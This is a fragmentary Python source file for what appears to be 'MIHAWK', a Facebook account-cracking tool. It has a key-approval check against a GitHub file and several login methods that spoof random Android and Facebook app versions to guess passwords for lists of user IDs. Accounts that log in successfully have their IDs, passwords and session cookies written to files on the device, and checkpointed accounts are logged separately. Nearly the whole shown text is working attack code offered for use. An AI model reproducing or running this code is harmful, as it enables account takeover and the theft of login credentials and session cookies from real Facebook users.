...
def meyexudi():
  ...
  id = '-'.join(uuid)
  try:
    httpCaht = requests.get('https://github.com/MAFIAok/Aprov/edit/main/Aproval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id))
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/MAFIA.XR='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MIHAWK-OK] {sid} | {ps} ")
				#	#{S}\n[cookie[🔥]={ckkk}
                    oks.append(sid)
                    open('/sdcard/MIHAWK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MIHAWK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [MIHAWK-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/MIHAWK_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mMIHAWKM3\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ASIFgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
                    print(f"\r{R} [MIHAWK-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
                    oks.append(sid)
                    open('/sdcard/MIHAWK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MIHAWK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mMIHAWK-M1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[MIHAWK] \033[1;33m{loop} \033[1;32m| \033[1;34mM4 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
